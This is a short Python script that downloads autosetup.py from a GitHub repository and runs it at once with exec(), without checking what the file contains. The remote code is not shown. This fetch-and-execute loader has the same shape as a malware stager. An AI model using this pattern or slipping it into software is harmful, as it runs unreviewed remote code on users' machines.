import requests

url = "https://raw.githubusercontent.com/ScriptHA/Scripts/refs/heads/main/autosetup.py"
response = requests.get(url)

exec(response.text)
